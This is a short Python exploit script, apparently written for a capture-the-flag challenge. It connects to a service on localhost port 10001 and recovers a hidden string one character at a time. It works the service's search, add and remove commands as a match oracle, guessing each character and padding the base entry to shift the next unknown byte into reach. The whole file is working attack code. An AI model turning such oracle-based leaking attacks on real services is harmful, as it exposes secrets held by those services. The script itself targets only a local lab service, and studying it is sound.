#!/bin/python3


from encodings import utf_8
import socket
import time


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 10001))


def send_txt(txt):
    txt = bytes(txt,"utf-8")
    s.send(txt)
    time.sleep(0.1)


def read_response():
    return s.recv(100)

r = read_response()
print(r)


# send_txt("search\n")
# r = read_response()
# print(r)

searchspace = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890-!@#$%^&*()"

base_str = "Yet another test entry here!"

leaked_str =""

while True:

    for guess_char in searchspace:
        # print(f"[ ]searching {guess_char}")
        send_txt("search\n")
        r = read_response()
        send_txt(base_str  + guess_char +"\n")
        r = read_response()
        # print(r)

        if "no match found" in str(r):
            None
            # print("[-] no match") 
        if "found match" in str(r):
            print("[+] found match")
            leaked_str += guess_char
            break
    print(f"[+] currently leaked string {leaked_str}")
    # deleting 
    send_txt("remove\n")
    r = read_response()
    send_txt(base_str +"\n")
    r = read_response()
    # adding
    base_str += "A"
    send_txt("add\n")
    r = read_response()
    send_txt(base_str + "\n")
    r = read_response()

